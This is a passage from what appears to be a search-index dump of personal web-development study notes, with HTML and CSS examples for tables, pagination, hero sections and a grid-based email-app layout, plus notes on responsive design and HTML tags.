class=\"testimonial-text\"&gt;\"Lorem ipsum dolor sit amet consectetur adipisicing elit. Magnam eligendi, quas a ab\n        fuga deleniti, cumque, illo reprehenderit numquam obcaecati corrupti et quibusdam\".&lt;/p&gt;\n    &lt;p class=\"testimonial-author\"&gt;Maria de Almeida&lt;/p&gt;\n    &lt;p class=\"testimonial-job\"&gt;Senior Product Mananger ar EDP Comercial&lt;/p&gt;\n    &lt;/blockquote&gt;\n    &lt;button class=\"btn btn--left\"&gt;\n    &lt;svg xmlns=\"http://www.w3.org/2000/svg\" fill=\"none\" viewBox=\"0 0 24 24\" stroke-width=\"1.5\" stroke=\"currentColor\"\n        class=\"btn-icon\"&gt;\n        &lt;path stroke-linecap=\"round\" stroke-linejoin=\"round\" d=\"M15.75 19.5L8.25 12l7.5-7.5\" /&gt;\n    &lt;/svg&gt;\n    &lt;/button&gt;\n    &lt;button class=\"btn btn--right\"&gt;\n    &lt;svg xmlns=\"http://www.w3.org/2000/svg\" fill=\"none\" viewBox=\"0 0 24 24\" stroke-width=\"1.5\" stroke=\"currentColor\"\n        class=\"btn-icon\"&gt;\n        &lt;path stroke-linecap=\"round\" stroke-linejoin=\"round\" d=\"M8.25 4.5l7.5 7.5-7.5 7.5\" /&gt;\n    &lt;/svg&gt;\n    &lt;/button&gt;\n    &lt;div class=\"dots\"&gt;\n    &lt;button class=\"dot dot--fill\"&gt;&amp;nbsp;&lt;/button&gt;\n    &lt;button class=\"dot\"&gt;&amp;nbsp;&lt;/button&gt;\n    &lt;button class=\"dot\"&gt;&amp;nbsp;&lt;/button&gt;\n    &lt;button class=\"dot\"&gt;&amp;nbsp;&lt;/button&gt;\n    &lt;/div&gt;\n&lt;/div&gt;\n&lt;/body&gt;\n\n&lt;/html&gt;\n</code></pre> Table component <pre><code>&lt;!DOCTYPE html&gt;\n&lt;html lang=\"en\"&gt;\n\n&lt;head&gt;\n&lt;meta charset=\"UTF-8\"&gt;\n&lt;meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\"&gt;\n&lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt;\n\n&lt;link rel=\"preconnect\" href=\"https://fonts.googleapis.com\"&gt;\n&lt;link rel=\"preconnect\" href=\"https://fonts.gstatic.com\" crossorigin&gt;\n&lt;link href=\"https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700&amp;display=swap\" rel=\"stylesheet\"&gt;\n\n&lt;title&gt; Component&lt;/title&gt;\n\n&lt;style&gt;\n\n* {\nmargin: 0;\npadding: 0;\nbox-sizing: border-box;\n}\n\nbody {\nfont-family: 'Inter', sans-serif;\ncolor: #343a40;\nline-height: 1;\ndisplay: flex;\njustify-content: center;\n}\n\ntable {\nwidth: 800px;\nmargin-top: 100px;\nfont-size: 18px;\n/*border: 1px solid #343a40;*/\n\n/*\n    WE ALWAYS NEED TO SET THIS EVEN IF th, td BORDERS ARE NOT SET,\n    OTHERWISE THERE WILL BE VISIBLE GAPS BETWEEN CELLS!\n    */\nborder-collapse: collapse;\n}\n\nth,\ntd {\n/*border: 1px solid #343a40;*/\npadding: 16px 24px;\ntext-align: left;\n}\n\n/*TO STYLE ALL THE CELLS INDIVIDUALLY WE NEVER STYLE thead, tbody, tr BUT CELLS(th, td) ONLY!*/\nthead th {\nbackground-color: #087f5b;\ncolor: #fff;\n/*\n    TO SET ALL COLUMNS' WIDTH EQUAL WE SET THE CELLS' WIDTH\n    OF THE FIRST ROW TO BE EQUAL USIN THI FORMULA: (100% / NUM OF CELLS(=COLUMNS))%.\n    THEN THE ENTIRE TABLE WILL ADJUST ITSELF TO THESE DIMENSIONS.\n    */\nwidth: 25%;\n}\n\ntbody tr:nth-child(odd) {\nbackground-color: #f8f9fa;\n}\n\ntbody tr:nth-child(even) {\nbackground-color: #e9ecef;\n}\n\n&lt;/style&gt;\n&lt;/head&gt;\n\n&lt;body&gt;\n&lt;table&gt;\n    &lt;thead&gt;\n    &lt;tr&gt;\n        &lt;th&gt;Chair&lt;/th&gt;\n        &lt;th&gt;The Laid Back&lt;/th&gt;\n        &lt;th&gt;The Worker Bee&lt;/th&gt;\n        &lt;th&gt;The Chair 4/2&lt;/th&gt;\n    &lt;/tr&gt;\n    &lt;/thead&gt;\n    &lt;tbody&gt;\n    &lt;tr&gt;\n        &lt;th&gt;Width&lt;/th&gt;\n        &lt;td&gt;80 cm&lt;/td&gt;\n        &lt;td&gt;60 cm&lt;/td&gt;\n        &lt;td&gt;22 0cm&lt;/td&gt;\n    &lt;/tr&gt;\n    &lt;tr&gt;\n        &lt;th&gt;Heght&lt;/th&gt;\n        &lt;td&gt;100 cm&lt;/td&gt;\n        &lt;td&gt;110 cm&lt;/td&gt;\n        &lt;td&gt;90 cm&lt;/td&gt;\n    &lt;/tr&gt;\n    &lt;tr&gt;\n        &lt;th&gt;Depth&lt;/th&gt;\n        &lt;td&gt;70 cm&lt;/td&gt;\n        &lt;td&gt;65 cm&lt;/td&gt;\n        &lt;td&gt;80 cm&lt;/td&gt;\n    &lt;/tr&gt;\n    &lt;tr&gt;\n        &lt;th&gt;Weight&lt;/th&gt;\n        &lt;td&gt;16 kg&lt;/td&gt;\n        &lt;td&gt;22 kg&lt;/td&gt;\n        &lt;td&gt;80 kg&lt;/td&gt;\n    &lt;/tr&gt;\n    &lt;/tbody&gt;\n&lt;/table&gt;\n&lt;/body&gt;\n\n&lt;/html&gt;\n</code></pre> Pagination Component <pre><code>&lt;!DOCTYPE html&gt;\n&lt;html lang=\"en\"&gt;\n\n&lt;head&gt;\n&lt;meta charset=\"UTF-8\"&gt;\n&lt;meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\"&gt;\n&lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt;\n\n&lt;link rel=\"preconnect\" href=\"https://fonts.googleapis.com\"&gt;\n&lt;link rel=\"preconnect\" href=\"https://fonts.gstatic.com\" crossorigin&gt;\n&lt;link href=\"https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700&amp;display=swap\" rel=\"stylesheet\"&gt;\n\n&lt;title&gt; Component&lt;/title&gt;\n\n&lt;style&gt;\n\n* {\nmargin: 0;\npadding: 0;\nbox-sizing: border-box;\n}\n\nbody {\nfont-family: 'Inter', sans-serif;\ncolor: #343a40;\nline-height: 1;\ndisplay: flex;\njustify-content: center;\n}\n\n.pagination {\ndisplay: flex;\nalign-items: center;\ngap: 12px;\nmargin-top: 200px;\n}\n\n.page-link:link,\n.page-link:visited {\nfont-size: 18px;\ncolor: #343a40;\ntext-decoration: none;\n/*WE CAN SPECIFY HERE WIDTH FOR ANCHOR ELEMENTS BECAUSE THEY ARE NOW BECAME BLOCK ELEMENTS\nAS EACH OF THEM IS A FLEX ELEMENT NOW AND FLEX ELEMENT IS ALWAYS A BLOCK ELEMENT!*/\nheight: 36px;\nwidth: 36px;\nborder-radius: 50%;\n\ndisplay: flex;\njustify-content: center;\nalign-items: center;\n}\n\n.page-link:hover,\n.page-link:active,\n.page-link.page-link--current {\ncolor: #fff;\nbackground-color: #087f5b;\n}\n\n.btn {\n/*border: none;*/\nborder: 1px solid #087f5b;\nheight: 48px;\nwidth: 48px;\nborder-radius: 50%;\nbackground: none;\ncursor: pointer;\n}\n\n.btn:hover {\nbackground-color: #087f5b;\n}\n\n.btn:hover .btn-icon {\nstroke: #fff;\n}\n\n.btn-icon {\nheight: 24px;\nwidth: 24px;\nstroke: #087f5b;\n}\n\n.dots {\ncolor: #868e96;\n}\n\n&lt;/style&gt;\n&lt;/head&gt;\n\n&lt;body&gt;\n&lt;div class=\"pagination\"&gt;\n    &lt;button class=\"btn btn--left\"&gt;\n    &lt;svg xmlns=\"http://www.w3.org/2000/svg\" fill=\"none\" viewBox=\"0 0 24 24\" stroke-width=\"1.5\" stroke=\"currentColor\"\n        class=\"btn-icon\"&gt;\n        &lt;path stroke-linecap=\"round\" stroke-linejoin=\"round\" d=\"M15.75 19.5L8.25 12l7.5-7.5\" /&gt;\n    &lt;/svg&gt;\n    &lt;/button&gt;\n    &lt;a href=\"#\" class=\"page-link\"&gt;1&lt;/a&gt;\n    &lt;a href=\"#\" class=\"page-link\"&gt;2&lt;/a&gt;\n    &lt;a href=\"#\" class=\"page-link page-link--current\"&gt;3&lt;/a&gt;\n    &lt;a href=\"#\" class=\"page-link\"&gt;4&lt;/a&gt;\n    &lt;a href=\"#\" class=\"page-link\"&gt;5&lt;/a&gt;\n    &lt;a href=\"#\" class=\"page-link\"&gt;6&lt;/a&gt;\n    &lt;span class=\"dots\"&gt;...&lt;/span&gt;\n    &lt;a href=\"#\" class=\"page-link\"&gt;23&lt;/a&gt;\n    &lt;button class=\"btn btn--right\"&gt;\n    &lt;svg xmlns=\"http://www.w3.org/2000/svg\" fill=\"none\" viewBox=\"0 0 24 24\" stroke-width=\"1.5\" stroke=\"currentColor\"\n        class=\"btn-icon\"&gt;\n        &lt;path stroke-linecap=\"round\" stroke-linejoin=\"round\" d=\"M8.25 4.5l7.5 7.5-7.5 7.5\" /&gt;\n    &lt;/svg&gt;\n    &lt;/button&gt;\n&lt;/div&gt;\n&lt;/body&gt;\n\n&lt;/html&gt;\n</code></pre>"},{"location":"Dev/Prg/Langs/Css/#layout-patterns","title":"Layout Patterns","text":"Hero Section <pre><code>&lt;!DOCTYPE html&gt;\n&lt;html lang=\"en\"&gt;\n\n&lt;head&gt;\n&lt;meta charset=\"UTF-8\"&gt;\n&lt;meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\"&gt;\n&lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt;\n&lt;title&gt;Omnifood Hero Section&lt;/title&gt;\n&lt;link rel=\"preconnect\" href=\"https://fonts.googleapis.com\"&gt;\n&lt;link rel=\"preconnect\" href=\"https://fonts.gstatic.com\" crossorigin&gt;\n&lt;link href=\"https://fonts.googleapis.com/css2?family=Rubik:wght@400;600;700&amp;display=swap\" rel=\"stylesheet\"&gt;\n&lt;style&gt;\n* {\nmargin: 0;\npadding: 0;\nbox-sizing: border-box;\n}\n\nhtml {\nfont-family: \"Rubik\", sans-serif;\ncolor: #444;\n}\n\n.container {\nmargin: 0 auto;\nwidth: 1800px;\n}\n\nheader {\n/* background-color: orangered; */\nheight: 100vh;\nposition: relative;\n\nbackground-image: linear-gradient(rgba(34, 34, 34, 0.6), rgba(34, 34, 34, 0.6)), url(hero.jpg);\nbackground-size: cover;\ncolor: #fff;\n}\n\nnav {\nfont-size: 20px;\nfont-weight: 700;\ndisplay: flex;\njustify-content: space-between;\npadding-top: 32px;\n/* background-color: green; */\n}\n\n.header-container {\nwidth: 1800px;\nposition: absolute;\n\n/* In relation to PARENT size */\nleft: 50%;\ntop: 50%;\n/* In relation to ELEMENT size */\ntransform: translate(-50%, -50%);\n\n/* background-color: violet; */\n}\n\n.header-container-inner {\nwidth: 50%;\n}\n\nh1 {\nfont-size: 52px;\nmargin-bottom: 32px;\nline-height: 1.05;\n}\n\np {\nfont-size: 20px;\nline-height: 1.6;\nmargin-bottom: 48px;\n}\n\n.btn:link,\n.btn:visited {\nfont-size: 20px;\nfont-weight: 600;\nbackground-color: #e67e22;\ncolor: #fff;\ntext-decoration: none;\ndisplay: inline-block;\npadding: 16px 32px;\nborder-radius: 9px;\n}\n\nh2 {\nfont-size: 44px;\nmargin-bottom: 48px;\n}\n\nsection {\npadding: 96px 0;\nbackground-color: #f7f7f7;\n}\n\n&lt;/style&gt;\n&lt;/head&gt;\n\n&lt;body&gt;\n&lt;header&gt;\n    &lt;nav class=\"container\"&gt;\n    &lt;div&gt;LOGO&lt;/div&gt;\n    &lt;div&gt;NAVIGATION&lt;/div&gt;\n    &lt;/nav&gt;\n\n    &lt;div class=\"header-container\"&gt;\n    &lt;div class=\"header-container-inner\"&gt;\n        &lt;h1&gt;A healthy meal delivered to your door, every single day&lt;/h1&gt;\n        &lt;p&gt;The smart 365-days-per-year food subscription that will make you eat healthy algain. Tailored to your\n        personal\n        tastes and nutritional needs&lt;/p&gt;\n        &lt;a href=\"#\" class=\"btn\"&gt;Start eating well&lt;/a&gt;\n    &lt;/div&gt;\n    &lt;/div&gt;\n&lt;/header&gt;\n\n&lt;section&gt;\n    &lt;div class=\"container\"&gt;\n    &lt;h2&gt;Some random heading&lt;/h2&gt;\n    &lt;p&gt;Lorem ipsum dolor sit amet consectetur adipisicing elit. Quibusdam fuga est necessitatibus! Eius similique\n        perspiciatis dignissimos officiis pariatur inventore. Rem quisquam tempora adipisci rerum illum magni excepturi\n        molestias nesciunt repellendus, eligendi aspernatur odio labore nisi, quos sunt! Consequatur, quidem, voluptatum\n        illo, fuga necessitatibus temporibus neque provident vero minima culpa ratione excepturi non. Deserunt, ex harum\n        perspiciatis deleniti ut labore eaque facere aliquid quo aut dolores consectetur molestiae debitis porro rem,\n        quia ullam minus magnam nobis! Ex aliquam assumenda ut non ipsa rem distinctio! A nobis earum perferendis culpa\n        tempora atque ea nam eos sequi neque, illum, delectus distinctio expedita accusamus.&lt;/p&gt;\n    &lt;/div&gt;\n&lt;/section&gt;\n&lt;/body&gt;\n\n&lt;/html&gt;\n</code></pre> Web App Layout <p>Fake Email Application:</p> <pre><code>&lt;!DOCTYPE html&gt;\n&lt;html lang=\"en\"&gt;\n\n&lt;head&gt;\n&lt;meta charset=\"UTF-8\"&gt;\n&lt;meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\"&gt;\n&lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt;\n&lt;title&gt;App Layout&lt;/title&gt;\n\n&lt;style&gt;\n* {\nmargin: 0;\npadding: 0;\nbox-sizing: border-box;\n}\n\nbody {\nfont-family: sans-serif;\ncolor: #343a40;\nfont-size: 24px;\nheight: 100vh;\ntext-align: center;\nfont-weight: bold;\n\ndisplay: grid;\ngrid-template-columns: 80px 400px 1fr 250px;\ngrid-template-rows: 80px 1fr;\n}\n\nnav,\nsection,\nmain,\naside {\npadding-top: 24px;\n}\n\nnav {\nbackground-color: #343a40;\ngrid-row: 1 / -1;\ncolor: #fff;\n}\n\nmenu {\nbackground-color: #7048e8;\ngrid-column: 2 / -1;\n\ndisplay: flex;\nalign-items: center;\ngap: 12px;\npadding: 0 40px;\n}\n\nbutton {\ndisplay: inline-block;\nfont-size: 16px;\nfont-weight: bold;\nbackground-color: #5f3dc4;\nborder: none;\ncursor: pointer;\ncolor: #fff;\npadding: 8px 12px;\n}\n\nbutton:last-child {\nbackground-color: #d6336c;\nmargin-left: auto;\n}\n\nsection {\nbackground-color: #e9ecef;\npadding: 40px;\n\n/*How elements that don't fit into container appear*/\noverflow-y: scroll;\n\ndisplay: flex;\nflex-direction: column;\ngap: 40px;\n}\n\n.email {\nbackground-color: #adb6bd;\nheight: 96px;\n/*Beacuse of flex we need to set this in order to\n'overflow-y' in 'section' selector will take effect*/\nflex-shrink: 0;\n\ndisplay: flex;\nalign-items: center;\njustify-content: center;\n}\n\naside {\nbackground-color: #e9ecef;\n}\n\n&lt;/style&gt;\n&lt;/head&gt;\n\n&lt;body&gt;\n&lt;nav&gt;Nav&lt;/nav&gt;\n&lt;menu&gt;\n    &lt;button&gt;New&lt;/button&gt;\n    &lt;button&gt;Reply&lt;/button&gt;\n    &lt;button&gt;Forward&lt;/button&gt;\n    &lt;button&gt;Mark unread&lt;/button&gt;\n    &lt;button&gt;Trash&lt;/button&gt;\n&lt;/menu&gt;\n&lt;section&gt;\n    &lt;div class=\"email\"&gt;Email 1&lt;/div&gt;\n    &lt;div class=\"email\"&gt;Email 2&lt;/div&gt;\n    &lt;div class=\"email\"&gt;Email 3&lt;/div&gt;\n    &lt;div class=\"email\"&gt;Email 4&lt;/div&gt;\n    &lt;div class=\"email\"&gt;Email 5&lt;/div&gt;\n    &lt;div class=\"email\"&gt;Email 6&lt;/div&gt;\n    &lt;div class=\"email\"&gt;Email 7&lt;/div&gt;\n    &lt;div class=\"email\"&gt;Email 8&lt;/div&gt;\n    &lt;div class=\"email\"&gt;Email 9&lt;/div&gt;\n    &lt;div class=\"email\"&gt;Email 10&lt;/div&gt;\n&lt;/section&gt;\n&lt;main&gt;Email view&lt;/main&gt;\n&lt;aside&gt;Additional info&lt;/aside&gt;\n&lt;/body&gt;\n\n&lt;/html&gt;\n</code></pre>"},{"location":"Dev/Prg/Langs/Css/#responsive-design","title":"Responsive Design","text":"<p>Responsive Web Design:</p> <ul> <li>Design technique to make a webpage adjust its layout and visual style to any possible screen size (window or viewport size).</li> <li>In practice, this means that responsive design makes websites usable on all devices, such as desktop computers, tablets, and mobile phones.</li> <li>It\u2019s a set of best practices and of techniques, not a separate technology. It\u2019s all just CSS!</li> </ul> <p>Responsive Design Ingredients:</p> <ol> <li> <p>FLUID LAYOUTS</p> <ul> <li>To allow webpage to adapt to the current viewport width (or even height).</li> <li>Use <code>%</code> (or <code>vh</code> / <code>vw</code>) unit instead of <code>px</code> for elements that should adapt to viewport(usually layout).</li> <li>Use <code>max-width</code> instead of <code>width</code>.</li> </ul> <p>Flexbox and CSS grid, which are fluid by default.</p> </li> <li> <p>RESPONSIVE UNITS</p> <ul> <li> <p>Use <code>rem</code> unit instead of <code>px</code> for most lengths.</p> <p><code>rem</code> unit</p> <p>rem means root(root of the document = <code>&lt;html&gt;</code> element) element's font-size</p> <p><code>1rem</code> = <code>16px</code>(default browser font-size, unless the user does actually change it)</p> </li> <li> <p>To make it easy to scale the entire layout down(or up) automatically.</p> </li> <li> <p>Helpful trick: setting <code>1rem</code> to <code>10px</code> for easy calculations.</p> <p>Setting <code>1rem</code> to <code>10px</code></p> <p> Incorrect way:</p> <pre><code>/* doing it like this, we will not respect the user's definition of the browser font-size */\nhtml {\nfont-size: 10px;\n}\n</code></pre> <p> Correct way:</p> <pre><code>/* Percentage of user's browser font-size setting! */\nhtml {\nfont-size: 62.5%; /* 10px / 16px = 0.625 = 62.5%  */\n}\n</code></pre> </li> </ul> </li> <li> <p>FLEXIBLE IMAGES</p> <ul> <li>By default, images don\u2019t scale automatically as we change the viewport, so we need to fix that.</li> <li>Always use <code>%</code> for image dimensions, together with the <code>max-width</code> property.</li> </ul> </li> <li> <p>MEDIA QUERIES</p> <ul> <li>Brings all the other ingredients together and realy brings responsive sites to life!</li> <li>Without media queries, responsive web design would not work at all.</li> <li>To change CSS styles on certain viewport widths(called breakpoints), allowing to create different versions of a website for different types of devices.</li> </ul> <p>We usually write media queries only at the end of building a certain page or a certain component.</p> </li> </ol> DESKTOP FIRST DEVELOPMENT MOBILE FIRST DEVELOPMENT Start writing CSS for the desktop: large screen. Start writing CSS for mobile devices: small screen. Then, media queries shrink design to smaller screens. Then, media queries expand design to a large screen. Forces us to reduce websites and apps to the absolute essentials."},{"location":"Dev/Prg/Langs/Css/#useful-staff","title":"Useful staff","text":""},{"location":"Dev/Prg/Langs/Css/#css-tricks","title":"CSS Tricks","text":"<ul> <li>Using @font-face</li> </ul>"},{"location":"Dev/Prg/Langs/Css/#code-snippets","title":"Code snippets","text":"<ul> <li>Converting Color Spaces in JavaScript</li> <li>Stackoverflow: Javascript function to convert color names to hex codes</li> </ul>"},{"location":"Dev/Prg/Langs/Css/#fonts","title":"Fonts","text":"<ul> <li>CUFON Fonts</li> </ul>"},{"location":"Dev/Prg/Langs/Css/#scss","title":"SCSS","text":"<p>What is SCSS?</p>"},{"location":"Dev/Prg/Langs/Html/","title":"Html","text":"<p>Reference: W3S, MDN</p>"},{"location":"Dev/Prg/Langs/Html/#html-essentials","title":"Html Essentials","text":""},{"location":"Dev/Prg/Langs/Html/#syntax","title":"Syntax","text":""},{"location":"Dev/Prg/Langs/Html/#common-tags","title":"Common tags","text":"<p><code>&lt;head&gt;</code> - contains machine-readable information (metadata) about the document, like its title(<code>&lt;title&gt;</code>), scripts(<code>&lt;script&gt;</code>), and style sheets(<code>&lt;style&gt;</code>)</p> <p><code>&lt;meta&gt;</code> - represents Metadata that cannot be represented by other HTML meta-related elements, like <code>&lt;base&gt;</code>, <code>&lt;link /&gt;</code>, <code>&lt;script&gt;</code>, <code>&lt;style&gt;</code> or <code>&lt;title&gt;</code></p> <p><code>&lt;link /&gt;</code> - specifies relationships between the current document and an external resource. This element is most commonly used to link to CSS, but is also used to establish site icons (both \"favicon\" style icons and icons for the home screen and apps on mobile devices) among other things.</p> <p><code>&lt;title&gt;</code> - defines the document's title that is shown in a Browser's title bar or a page's tab. It only contains text; tags within the element are ignored.</p> <p><code>&lt;style&gt;</code> - contains style information for a document, or part of a document. It contains CSS, which is applied to the contents of the document containing the <code>&lt;style&gt;</code> element. But usually we specify stlyles in stanalone files and then connect them to the document using <code>&lt;link /&gt;</code> tag.</p> <p><code>&lt;body&gt;</code> - represents the content of an HTML document. There can be only one <code>&lt;body&gt;</code> element in a document.</p> <pre><code>&lt;!DOCTYPE html&gt;\n&lt;html lang=\"en\"&gt;\n  &lt;head&gt;\n    &lt;meta charset=\"UTF-8\" /&gt;\n    &lt;meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\" /&gt;\n\n    &lt;!-- This line is MUST HAVE in order the resposive design to work!!! --&gt;\n    &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" /&gt;\n\n    &lt;!-- Description of the site. MUST HAVE for SEO! --&gt;\n    &lt;meta\n      name=\"description\"\n      content=\"Omnifood is an AI-powered food subscription that will make you eat healthy again, 365 days per year. It's tailored to your personal tastes and nutritional needs.\"\n    /&gt;\n\n    &lt;link rel=\"icon\" href=\"img/favicon.png\" /&gt;\n\n    &lt;!-- Enabling ability to set site's shortcut on phone screen  --&gt;\n    &lt;!-- iPhone(image dimensions should be 192x192 px) --&gt;\n    &lt;link rel=\"apple-touch-icon\" href=\"img/apple-touch-icon.png\" /&gt;\n    &lt;!-- Android(2 images shold be used: 192x192 px and 512x512 px) --&gt;\n    &lt;link rel=\"manifest\" href=\"manifest.webmanifest\" /&gt;\n\n    &lt;!-- Connecting google fonts to the document --&gt;\n    &lt;link rel=\"preconnect\" href=\"https://fonts.googleapis.com\" /&gt;\n    &lt;link rel=\"preconnect\" href=\"https://fonts.gstatic.com\" crossorigin /&gt;\n    &lt;link\n      href=\"https://fonts.googleapis.com/css2?family=Rubik:wght@400;500;600;700&amp;display=swap\"\n      rel=\"stylesheet\"\n    /&gt;\n\n    &lt;!-- Connecting styles to the document --&gt;\n    &lt;link rel=\"stylesheet\" href=\"css/general.css\" /&gt;\n    &lt;link rel=\"stylesheet\" href=\"css/style.css\" /&gt;\n    &lt;link rel=\"stylesheet\" href=\"css/queries.css\" /&gt;\n\n    &lt;!-- Setting document's title --&gt;\n    &lt;title&gt;Omnifood &amp;mdash; Never cook again!&lt;/title&gt;\n  &lt;/head&gt;\n\n  &lt;body&gt;\n        .\n        .\n        .\n      &lt;/body&gt;\n&lt;/html&gt;\n</code></pre> manifest.webmanifest<pre><code>{\n\"icons\": [\n{\n\"src\": \"img/favicon-192.png\",\n\"type\": \"image/png\",\n\"sizes\": \"192x192\"\n},\n{\n\"src\": \"img/favicon-512.png\",\n\"type\": \"image/png\",\n\"sizes\": \"512x512\"\n}\n]\n}\n</code></pre> <p><code>&lt;h1&gt;</code>...<code>&lt;h6&gt;</code> - headings, as a good practice: each and every page should only have one <code>&lt;h1&gt;</code> heading, i.e. only one primary heading</p> <p><code>&lt;br&gt;</code> - break <code>&lt;hr&gt;</code> - horizontal line</p> <p><code>&lt;img src=\"post-img.jpg\" alt=\"HTML code on a screen\" width=\"500\" height=\"200\"/&gt;</code> - image tag</p> <ul> <li><code>alt</code> attribute defines what the image is, this is a must have for the accessibility</li> <li>we can only set <code>width</code> attribute and the image's aspect ratio is automatically maintained</li> <li> <p>when the image set as decoration through the css style:</p> <p>use of <code>role</code> and <code>aria-label</code> attributes for the accessibility</p> index.html<pre><code>&lt;div\n    class=\"cta-img-box\"\n    role=\"img\"\n    aria-label=\"Women enjoing food\"\n&gt;&lt;/div&gt;\n</code></pre> style.css<pre><code>.cta-img-box {\nbackground-image: url(../img/eating.jpg);\nbackground-size: cover;\nbackground-position: center;\n}\n</code></pre> </li> </ul> <p><code>&lt;a href=\"newpage.html\"&gt;</code> - anchor tag <code>&lt;a href=\"url\" target=\"_blank\"&gt;</code> - open a link in a new tab <code>&lt;a href=\"#\"&gt;Up&lt;/a&gt;</code> - link that points to nowhere, actually clicking on it take us to the top of the page</p> <p><code>&lt;div&gt;</code> - allows divide up content to sections, each section can have its own style in css <code>&lt;span&gt;</code> - similar, but inline for specific element</p>"},{"location":"Dev/Prg/Langs/Html/#form-tag-and-its-accompanying-elements","title":"Form tag and its accompanying elements","text":"<pre><code>&lt;!-- each field need to have a name attribute --&gt;\n&lt;form&gt;\n    First name: &lt;input type=\"text\" name=\"firstname\" required&gt;\n    Email: &lt;input type=\"email\" name=\"email\"&gt;\n    Birthday: &lt;input type=\"date\" name=\"birth\"&gt;\n    Password: &lt;input type=\"password\" minlength=\"5\" name=\"password\"&gt;\n    Gender: &lt;input type=\"radio\" name=\"gender\" value=\"male\"&gt; male  &lt;input type=\"radio\" name=\"gender\" value=\"female\"&gt; female\n    &lt;!-- name allow radio only select once, value allow machine to know which one is click in radio --&gt;\n    Pet: &lt;input type=\"checkbox\" name=\"dog\"&gt; dog   &lt;input type=\"checkbox\" name=\"cat\"&gt; cat\n    Car:  &lt;!-- dropdown menu --&gt;\n    &lt;select name=\"cars\"&gt;  &lt;!-- the name can associate with a value--&gt;\n        &lt;option value=\"volvo\"&gt; Volvo &lt;/option&gt;\n        &lt;option value=\"Audi\"&gt; Audi &lt;/option&gt;\n    &lt;/select&gt;\n    &lt;input type=\"submit\" value=\"register\"&gt;\n    &lt;input type=\"reset\"&gt;\n&lt;/form&gt;\n</code></pre> <p>after submit this form, form automatically use an attribute method=\"GET\" to send the query string to back-end</p> <p>we might use method=\"POST\" which hide your information in the web link</p>"},{"location":"Dev/Prg/Langs/Html/#table-tag-and-its-child-elements","title":"Table tag and its child elements","text":"<pre><code>&lt;table&gt;\n  &lt;tr&gt;  &lt;!-- table row --&gt;\n    &lt;th&gt;Month&lt;/th&gt;  &lt;!-- table header --&gt;\n    &lt;th&gt;Savings&lt;/th&gt;\n  &lt;/tr&gt;\n  &lt;tr&gt;\n    &lt;td&gt;January&lt;/td&gt;  &lt;!-- table cell  --&gt;\n    &lt;td&gt;$100&lt;/td&gt;\n    &lt;td&gt;$120&lt;/td&gt;\n  &lt;/tr&gt;\n</code></pre>"},{"location":"Dev/Prg/Langs/Html/#html5-semantics","title":"HTML5 Semantics","text":"<p>HTML elements reference(MDN)</p> <p>Adds new semantic elements, i.e. they have a meaning or a purpose attached to them. They don't affect old version websites. So when we think about a certain HTML element, we should actually not think about what that element looks like as it's rendered on the page.But instead we should think about what that element actually means and what it stands for. Not all elements are semantic. For instace <code>&lt;div&gt;</code> is a generic container element. We should use such elements only when we don't want to attach a certain meaning to a certain part of the page.</p> <p>Good for:</p> <ul> <li>SEO(Search Engine Optimization) - search engine such as Google will be able to understand the structure of our content. And therefore they will be better able to analyze what our content and what our webpage is all about.</li> <li>Accessibilityand especially for people who rely on screen readers to consume on web pages.</li> </ul>"},{"location":"Dev/Prg/Langs/Html/#content-sectioning","title":"Content sectioning","text":"<ul> <li> <p><code>&lt;header&gt;</code> - the top part of a web document(usually includes <code>&lt;h1&gt;</code> and <code>&lt;nav&gt;</code> in it) or a some smaller unit.</p> </li> <li> <p><code>&lt;nav&gt;</code> - page navigation: couple of links at the top of a page.</p> </li> <li> <p><code>&lt;main&gt;</code> - represents the dominant content of the body of a document. The main content area consists of content that is directly related to or expands upon the central topic of a document, or the central functionality of an application. What it does not include is content that is repeated across multiple pages, like e.g. <code>&lt;header&gt;</code> or <code>&lt;footer&gt;</code> elements.</p> </li> <li> <p><code>&lt;article&gt;</code> - very common element that we can use for a written article: blog post, etc.</p> </li> <li> <p><code>&lt;aside&gt;</code> - usually used for some secondary information that compliments the information in the main part of the page. For instance if the main part of the page is the <code>&lt;article&gt;</code> then the <code>&lt;aside&gt;</code> is basically some related posts. Visually many times we use the <code>&lt;aside&gt;</code> element as a sidebar.</p> </li> <li> <p><code>&lt;section&gt;</code> - represents a generic standalone section of a document, which doesn't have a more specific semantic element to represent it. Sections should always have a heading, with very few exceptions.</p> </li> <li> <p><code>&lt;h1&gt;</code>...<code>&lt;h6&gt;</code> - represent six levels of section headings. <code>&lt;h1&gt;</code> is the highest section level and <code>&lt;h6&gt;</code> is the lowest.</p> </li> <li> <p><code>&lt;address&gt;</code> - indicates that the enclosed HTML provides contact information for a person or people, or for an organization.</p> </li> <li> <p><code>&lt;footer&gt;</code> - content that comes at the very end of the page, e.g.:</p> <p><code>&lt;footer&gt;Copyright &amp;copy; by The Code Magazine.&lt;/footer&gt;</code> \u2192 Copyright \u00a9 by The Code Magazine.</p> <p>HTTP entities</p> <p><code>&amp;copy;</code> is a HTML entity for the copyright sign. See the full list of HTML entities at HTML Entity Reference by CSS-Tricks</p> </li> </ul>"},{"location":"Dev/Prg/Langs/Html/#text-content","title":"Text content","text":"<ul> <li> <p><code>&lt;menu&gt;</code> - semantic alternative to <code>&lt;ul&gt;</code>, but treated by browsers (and exposed through the accessibility tree) as no different than <code>&lt;ul&gt;</code>. It represents an unordered list of items (which are represented by <code>&lt;li&gt;</code> elements).</p> </li> <li> <p><code>&lt;blockquote&gt;</code> - indicates that the enclosed text is an extended quotation. Usually, this is rendered visually by indentation. A URL for the source of the quotation may be given using the <code>cite</code> attribute, while a text representation of the source can be given using the <code>&lt;cite&gt;</code> element.</p> </li> <li> <p><code>&lt;figure&gt;</code> - represents self-contained content, potentially with an optional caption, which is specified using the <code>&lt;figcaption&gt;</code> element. The figure, its caption, and its contents are referenced as a single unit.</p> <p>Usage: 